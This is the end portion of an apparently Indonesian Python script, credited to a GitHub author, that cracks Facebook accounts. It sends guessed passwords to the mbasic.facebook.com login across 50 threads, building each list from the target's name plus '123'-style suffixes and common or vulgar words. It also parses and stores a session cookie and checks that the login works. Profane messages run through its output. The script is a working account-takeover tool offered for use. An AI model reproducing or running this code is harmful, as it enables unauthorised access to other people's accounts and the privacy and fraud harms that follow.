			print("\n  [!] anda bisa menjedah proses crack dengan mematikan data seluler atau CTRL + Z \n")
			with Bool(max_workers=50) as tokai:
				for xa in self.id:
					try:
						xi=xa.split("<=>")
						xe=xi[1].split(" ")
						if len(xe)==1 or len(xe)==2 or len(xe)==3 or len(xe)==4 or len(xe)==5:
							if len(xe[0])<=5:
								pewe=[xe[0]+"123",xe[0]+"12345","bismillah","sayang","kontol","bangsat","anjing","freefire"]
							else:
								pewe=[xe[0],xe[0]+"123",xe[0]+"1234",xe[0]+"12345","bismillah","sayang","kontol","bangsat","anjing","freefire"]
						else:
							pewe=["bismillah","sayang","kontol","bangsat","anjing","freefire"]
						tokai.submit(self.modol,xi[0],pewe,"https://mbasic.facebook.com")
					except:pass
			exit("\n\n  [#] crack selesai...")
		else:
			print("[!] Isi Yang Bener Ajg");self.ngontol()
# ngontol
def zxss(kuk):
	dict={}
	if "; " in kuk:
		kek=kuk.split("; ")
		if len(kek)==1:
			return {"cookie":kuk}
		else:
			for x in kek:
				dict.update({x.split("=")[0]:x.split("=")[1]})
			return dict
	else:
		kek=kuk.split(";")
		if len(kek)==1:
			return {"cookie":kuk}
		else:
			for x in kek:
				dict.update({x.split("=")[0]:x.split("=")[1]})
			return dict
class asup:
	def __init__(self,cok):
		self.cok=cok
	def login(self):
		try:
			cek=req.get("https://mbasic.facebook.com/profile.php",cookies=zxss(self.cok)).text
			if "mbasic_logout_button" in cek:
				print("\n\n[*] Hai, Welcome "+re.findall("\<title\>(.*?)<\/title\>",cek)[0]+" Ngentod:v")
				waktu(1)
				print("[!] Mohon Tunggu Sebentar Ngentod:v")
				open("cookie","w").write(self.cok)
				if "Apa yang Anda pikirkan sekarang" in cek:
					exit("[*] Login Berhasil, Jalankan Ulang Tools Nya")
				else:
					exit("[*] Login Berhasil, Jalankan Ulang Tools Nya")
			else:
				exit("\n\n[!] Cookie Invalid")
		except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
			exit("[!] Kesalahan Pada Koneksi")

if __name__=="__main__":
	try:
		kueh=zxss(open("cookie","r").read().strip())
	except FileNotFoundError:
		os.system("clear")
		print("\n[*] Cara Mendapatkan Cookie : https://youtu.be/ZT4MU7AlgA4\n[*] Ketik OPEN Untuk Membuka Video\n")
		while True:
			a=input("[?] Masukkan Cookie : ")
			if a in[""," "]:
				print("[!] Jangan Kosong")
			elif a in["open","OPEN","Open"]:
				import subprocess
				exit(subprocess.Popen(["am","start","https://youtu.be/ZT4MU7AlgA4"],stderr=subprocess.PIPE,stdin=subprocess.PIPE,stdout=subprocess.PIPE).wait())
			else:
				asup(a).login()
	ngentod().menu()


"""
Create By Aap Afandi Ganteng
GITHUB : https://github.com/KangPacman
"""
